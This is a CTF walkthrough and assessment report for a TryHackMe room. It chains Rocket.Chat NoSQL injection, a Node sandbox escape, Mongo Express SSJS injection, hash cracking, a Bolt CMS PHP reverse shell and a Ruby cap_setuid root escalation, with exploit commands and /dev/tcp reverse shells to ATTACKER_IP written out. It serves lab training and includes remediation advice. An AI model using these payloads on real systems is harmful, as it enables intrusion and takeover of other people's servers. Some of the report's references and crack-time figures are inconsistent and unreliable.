# Rocket : Walkthrough & Security Assessment Report

## Room info
- Platform: TryHackMe
- Target: 10.129.171.71
- Room type: CTF (Hard)
- Date solved: 2026-04-30
- Objectives: Obtain user.txt and root.txt flags on a multi-container Docker environment

## Objective status
- user.txt: THM{9f87696626a585380d3c1697087e5b5b}
- root.txt: THM{6613b7f76a88b32230eac584b0e18cfd}

## Exploitation chain
1. **CVE-2021-22911 — NoSQL Injection in Rocket.Chat 3.12.1**: Register a throwaway account, trigger password reset for admin, extract the 43-character reset token via blind `$where` JavaScript injection character-by-character, then reset the admin password through the DDP protocol.
2. **RCE via Rocket.Chat Outgoing Webhook Sandbox Escape**: Create an outgoing webhook with a malicious `prepare_outgoing_request` script that uses `process.mainModule.require` to bypass the Node.js sandbox and execute arbitrary shell commands. Output is exfiltrated back through the Rocket.Chat API.
3. **Container Pivot to Mongo Express**: Deploy Chisel on the Rocket.Chat container to tunnel port 8081, then access Mongo Express at 172.17.0.4:8081 with credentials `admin:pass`. Exploit CVE-2019-10758 (SSJS injection in `checkValid`) to get a reverse shell as root in the Mongo Express container.
4. **Database Backup Extraction**: Locate the MongoDB BSON backup at `/backup/db_backup/meteor/` containing Terrance's bcrypt hash with a weak cost factor of 4. Crack it with `john --format=bcrypt` and rockyou.txt.
5. **Bolt CMS Pivot**: Log into Bolt CMS at `rocket.thm/bolt` using `terrance@rocket.thm` with the cracked password. Use the Bolt CMS file editor to inject a PHP reverse shell into `config/bundles.php`, yielding a shell as user `alvin` on the host.
6. **Privilege Escalation via cap_setuid**: The Ruby binary has `cap_setuid+ep` set. Execute `ruby -e 'Process::Sys.setuid(0); exec("/bin/bash")'` to escalate to root and read root.txt.

## Key findings
- Services: Apache 2.4.29 (Ubuntu), Rocket.Chat 3.12.1, Bolt CMS 5.x, MongoDB 4.x, Mongo Express, SSH
- Interesting paths: `/api/v1/users.list` (NoSQL injection), `/api/v1/method.call/resetPassword` (DDP over REST), `/api/contents` (unauthenticated Bolt CMS API), `/backup/db_backup/` (MongoDB dump)
- Credentials exposed: Mongo Express `admin:pass`, Rocket.Chat admin `admin@rocket.thm : P@$$w0rd!1234`, Bolt CMS `terrance@rocket.thm : <cracked_password>`
- Users enumerated: admin, laurent, terrance (Rocket.Chat), marcus, kevin, lucy, laurent (Bolt CMS)
- Questions/answers:
  - Q1 (user.txt): `THM{9f87696626a585380d3c1697087e5b5b}`
  - Q2 (root.txt): `THM{6613b7f76a88b32230eac584b0e18cfd}`

## Vulnerability analysis
| Vulnerability name | Issue description | Impact | How it was solved (remediation) | What I learned |
|--------------------|-------------------|--------|----------------------------------|----------------|
| CVE-2021-22911 — NoSQL Injection | Rocket.Chat 3.12.1 allows MongoDB `$where` operator injection in `/api/v1/users.list`. An attacker can blind-extract password reset tokens character-by-character via regex. | Unauthenticated admin account takeover, full control of the Rocket.Chat instance. | Upgrade to Rocket.Chat >= 3.13.0. Sanitize `$where` and restrict aggregation operators in user-facing API endpoints. | MongoDB `$where` is essentially `eval()`. Any user-controllable input passed into it is a full JS injection. Blind extraction with regex is slow but reliable — 12 threads in parallel makes it practical. |
| Node.js Sandbox Escape | Rocket.Chat integration scripts run in a VM sandbox, but `console.log.constructor("return process.mainModule.require")()` bypasses it completely. | Remote code execution in the Rocket.Chat Docker container as the rocketchat user. | Disable script execution in integrations, or sandbox with `vm2` with proper context isolation. Never rely on `vm.runInNewContext` alone for security. | The `vm` module in Node.js is not a security boundary. The `constructor` chain always leads back to the host's `require`. |
| CVE-2019-10758 — Mongo Express SSJS Injection | Mongo Express's `/checkValid` endpoint evaluates arbitrary JavaScript via `db.eval()`. Unauthenticated access. | Root-level RCE in the Mongo Express container. | Remove Mongo Express from production, or enforce strong authentication and restrict network access. Disable `checkValid` endpoint. | Even "admin-only" internal tools like Mongo Express become attack surfaces once an attacker gains a foothold in the Docker network. Defense-in-depth matters. |
| Weak bcrypt Cost Factor | The database backup hash uses bcrypt cost factor 4 ($2y$04$) instead of the standard 10-12. | Hash cracks in seconds with rockyou.txt instead of years. | Always use cost factor >= 10 for bcrypt. Rotate backup hashes. | Cost factor makes a difference of orders of magnitude in cracking time. Old backups with weak settings are a liability. |
| Ruby cap_setuid | `/usr/bin/ruby2.5` has the `cap_setuid+ep` Linux capability set, allowing any user to change UID to 0. | Full root privilege escalation from any user context. | Remove the `cap_setuid` capability from the Ruby binary: `setcap -r /usr/bin/ruby2.5`. | Capabilities are granular but dangerous. `cap_setuid` effectively grants root without authentication. Always audit binary capabilities with `getcap -r /`. |
| Apache Proxy Misconfiguration | Apache proxies `/api/*` to Rocket.Chat but does NOT proxy WebSocket upgrades, causing 400 errors. Also blocks `/hooks/*` path. | Limited attack surface but breaks legitimate WebSocket functionality. | Use `mod_proxy_wstunnel` for WebSocket support. Properly document proxy rules. | Understanding reverse proxy behavior is critical — what works on the backend may not work through the proxy. |

## Commands worth keeping
```bash
# ===== RECONNAISSANCE =====
nmap -sCV -p 22,80 10.129.171.71
gobuster vhost -u http://10.129.171.71 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster dir -u http://rocket.thm -w /usr/share/wordlists/dirb/common.txt -x db,sql,sqlite,bak,zip,tar.gz

# ===== CVE-2021-22911 TOKEN EXTRACTION =====
# Register throwaway account
curl -s http://10.129.171.71/api/v1/users.register \
  -H "Host: chat.rocket.thm" \
  -d '{"username":"pwnerXXXXXX","name":"pwnerXXXXXX","email":"pwnerXXXXXX@rocket.thm","pass":"P@$$w0rd!1234","confirm-pass":"P@$$w0rd!1234"}'

# Login
curl -s http://10.129.171.71/api/v1/login \
  -H "Host: chat.rocket.thm" \
  -d '{"user":"pwnerXXXXXX@rocket.thm","password":"P@$$w0rd!1234"}'

# Trigger password reset
curl -s http://10.129.171.71/api/v1/users.forgotPassword \
  -H "Host: chat.rocket.thm" -H "X-Auth-Token: <TOKEN>" -H "X-User-Id: <UID>" \
  -d '{"email":"admin@rocket.thm"}'

# Blind $where injection (character by character)
curl -s "http://10.129.171.71/api/v1/users.list?query=%7B%22%24where%22%3A%22this.services.password.reset.token%20%26%26%20%2F%5EKNOWNPREFIXCHAR%2F.test(this.services.password.reset.token)%22%2C%22username%22%3A%22admin%22%7D" \
  -H "Host: chat.rocket.thm" -H "X-Auth-Token: <TOKEN>" -H "X-User-Id: <UID>"

# Reset admin password via REST DDP method.call
curl -s http://10.129.171.71/api/v1/method.call/resetPassword \
  -H "Host: chat.rocket.thm" -H "X-Auth-Token: <TOKEN>" -H "X-User-Id: <UID>" \
  -d '{"message":"{\"msg\":\"method\",\"method\":\"resetPassword\",\"params\":[\"EXTRACTED_TOKEN\",\"P@$$w0rd!1234\"],\"id\":\"1\"}"}'

# Login as admin
curl -s http://10.129.171.71/api/v1/login \
  -H "Host: chat.rocket.thm" \
  -d '{"user":"admin@rocket.thm","password":"P@$$w0rd!1234"}'

# ===== WEBHOOK RCE =====
# Create outgoing webhook with sandbox escape script
# Script class with prepare_outgoing_request:
#   const require = console.log.constructor("return process.mainModule.require")();
#   const exec = require("child_process").execSync;
#   const o = exec("CMD", {timeout:15000, shell:true}).toString();
#   POST output back to Rocket.Chat API via http.request

# ===== CHISEL TUNNEL =====
# On attacker:
./chisel server -p 8000 --reverse
# Upload and run on container:
./chisel client ATTACKER_IP:8000 R:8081:172.17.0.4:8081

# ===== MONGO EXPRESS CVE-2019-10758 =====
# SSJS injection via checkValid:
curl -s http://127.0.0.1:8081/checkValid -d 'document={x:1}' -H "Content-Type: application/x-www-form-urlencoded"

# Reverse shell via node.js:
# payload = "this.constructor.constructor('return this.process')().mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"')"

# ===== CRACK TERRANCE'S HASH =====
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt terrance_hash.txt

# ===== BOLT CMS PHP REVERSE SHELL =====
# Login at http://rocket.thm/bolt with terrance@rocket.thm
# Navigate to File Editor, edit config/bundles.php
# Insert: <?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");

# ===== PRIVILEGE ESCALATION =====
getcap -r / 2>/dev/null
# /usr/bin/ruby2.5 = cap_setuid+ep
ruby -e 'Process::Sys.setuid(0); exec("/bin/bash")'
id  # euid=0(root)
cat /root/root.txt
cat /home/alvin/user.txt
```

## Loot & flags
- user.txt: `THM{9f87696626a585380d3c1697087e5b5b}`
- root.txt: `THM{6613b7f76a88b32230eac584b0e18cfd}`

## Senior-level lessons learned

### 1. Exploit chaining across Docker containers is the new standard for breach simulations
This room chains six distinct vulnerabilities across three containers and the host. In real-world engagements, initial foothold is rarely the end — the real value is in lateral movement. Every internal service (Mongo Express, Bolt CMS admin panel) is a potential pivot point. Treat every container as a beachhead, not an objective.

### 2. MongoDB NoSQL injection is as dangerous as SQL injection, just less understood
The `$where` operator is MongoDB's equivalent of `eval()`. Many developers assume that because MongoDB uses JSON, injection isn't possible. This is false — any operator that executes JavaScript (`$where`, `$accumulator`, `$function`) can be exploited. The blind extraction technique here (regex character-by-character) mirrors blind SQLi methodology exactly.

### 3. Sandbox escapes via prototype chain are a recurring pattern
The `process.mainModule.require` bypass is not specific to Rocket.Chat — it applies to any Node.js sandbox using the `vm` module. The fundamental problem is that JavaScript closures capture references to the global object, and constructor chains always lead back to it. This pattern reappears in Electron app security, browser extensions, and serverless functions. The only reliable defense is to not run untrusted code in the same Node.js process.

### 4. Weak bcrypt cost factors in backups create a time bomb
The production hash used cost factor 10 (uncrackable), but the backup used cost factor 4 (cracks in minutes). Organizations often harden production configurations while neglecting backups. A database backup with weaker settings is a liability that can undo all other authentication hardening. This is a common finding in real-world engagements — always check backup hashes, not just live ones.

### 5. Linux capabilities are granular but dangerous when misconfigured
`cap_setuid` on a binary that can execute arbitrary code (like Ruby, Python, or Node.js) is equivalent to setting the SUID bit. The `getcap -r /` command should be part of every Linux privilege escalation checklist. In real environments, capabilities are often set by automated tooling (Ansible, Puppet) without understanding the security implications, making them a common misconfiguration.

### Supporting notes
- **Real-world relevance**: Rocket.Chat is widely deployed as an open-source Slack alternative. CVE-2021-22911 had a CVSS of 9.8 and affected all versions < 3.13.0. Mongo Express is commonly deployed alongside MongoDB for administration. Bolt CMS is used for content management on LAMP stacks.
- **Detection**: NoSQL `$where` injection can be detected by monitoring API logs for requests containing `$where`, `$regex`, or `$gt` operators in query parameters. Webhook script creation should trigger alerts. Chisel traffic over port 8000/8081 can be detected as anomalous egress.
- **Hardening**: Upgrade Rocket.Chat to >= 3.13.0. Remove Mongo Express from production. Set `NODE_OPTIONS=--disallow_code_generation_from_strings` to mitigate some sandbox escapes. Remove `cap_setuid` from Ruby. Use network policies to restrict container-to-container communication. Never store database backups with weaker security settings than production.

## Vulnerability references
| Vulnerability | CVE | CVSS | Reference |
|---|---|---|---|
| Rocket.Chat NoSQL Injection | CVE-2021-22911 | 9.8 Critical | https://osv.dev/vulnerability/CVE-2021-22911 |
| Mongo Express SSJS Injection | CVE-2019-10758 | 9.8 Critical | https://osv.dev/vulnerability/CVE-2019-10758 |
| Weak bcrypt Cost Factor | N/A (misconfiguration) | — | NIST SP 800-63B (memory-hard hashes ≥ cost 10) |
| Ruby cap_setuid | N/A (capability misconfiguration) | — | https://www.cisa.gov/known-exploited-vulnerabilities-catalog |
| Node.js vm Sandbox Escape | N/A (design limitation) | — | https://github.com/advisories (Node.js Security WG advisories) |
| Apache Proxy Misconfiguration | N/A (configuration issue) | — | https://nvd.nist.gov/vuln/search |
